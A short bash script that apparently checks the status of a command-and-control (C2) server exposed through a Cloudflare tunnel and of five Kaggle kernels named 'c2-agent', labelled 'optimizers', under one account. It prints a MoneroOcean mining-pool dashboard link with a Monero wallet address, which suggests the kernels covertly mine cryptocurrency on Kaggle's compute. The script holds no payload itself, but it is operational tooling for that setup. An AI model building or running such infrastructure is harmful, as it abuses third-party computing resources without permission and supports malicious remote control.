#!/bin/bash
# Quick status check for C2 server and Kaggle optimizers

echo "═══════════════════════════════════════════════════════════"
echo "  C2 SERVER STATUS"
echo "═══════════════════════════════════════════════════════════"

# Server process
if pgrep -f "run_server.py" > /dev/null; then
    echo "✓ Server: RUNNING (PID: $(pgrep -f run_server.py))"
    echo "  Port: 18443"
    echo "  URL: https://aged-enabling-marking-bones.trycloudflare.com"
else
    echo "✗ Server: NOT RUNNING"
fi

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  KAGGLE OPTIMIZERS"
echo "═══════════════════════════════════════════════════════════"

# Kaggle kernels
echo "Account: stephenhowell94611"
echo "Kernels deployed: 5"
echo ""
echo "Monitor: https://moneroocean.stream/#/dashboard?addr=44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
echo ""

# Kernel URLs
for i in {1..5}; do
    echo "  [$i] https://www.kaggle.com/code/stephenhowell94611/c2-agent-$i"
done

echo ""
echo "═══════════════════════════════════════════════════════════"
